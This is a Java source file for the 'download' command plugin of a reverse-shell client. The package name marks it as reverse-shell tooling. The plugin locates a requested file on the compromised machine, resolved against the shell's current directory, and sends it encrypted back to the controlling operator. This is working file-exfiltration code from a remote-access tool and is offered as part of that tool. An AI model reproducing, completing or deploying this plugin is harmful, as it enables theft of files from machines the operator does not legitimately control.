package obs1d1anc1ph3r.reverseshell.client.plugins;

import java.io.File;
import obs1d1anc1ph3r.reverseshell.client.responsehandling.ResponseSender;
import obs1d1anc1ph3r.reverseshell.client.utils.FileTransferService;
import obs1d1anc1ph3r.reverseshell.client.utils.StreamHandler;

public class DownloadCommand implements CommandPlugin {

	private static String currentDir = System.getProperty("user.dir");
	private final StreamHandler streamHandler;
	private ResponseSender responseSender;

	public DownloadCommand(StreamHandler streamHandler) {
		this.streamHandler = streamHandler;
	}

	@Override
	public String getCommandName() {
		return "download";
	}

	@Override
	public String execute(String[] args) {
		if (args.length == 0) {
			return "Error: No file specified for download.";
		}

		//Get the directory from the CDCommand, idk if this is the best way to do it, but it works (I think)
		currentDir = CDCommand.getCurrentDirectory();
		String filePath = args[0];
		File file = new File(currentDir, filePath);
		System.out.println("[DEBUG] Attempting to download file: " + file.getAbsolutePath());

		if (!file.exists() || !file.isFile()) {
			return "Error: File not found at " + file.getAbsolutePath();
		}

		try {
			//Basically just pass on the responsability
			FileTransferService fileTransferService = new FileTransferService();
			fileTransferService.sendEncryptedFile(file, responseSender, streamHandler);
			return "";
		} catch (Exception e) {
			return "Error: Unable to send file: " + e.getMessage();
		}
	}

	public void setResponseSender(ResponseSender responseSender) {
		this.responseSender = responseSender;
	}
}
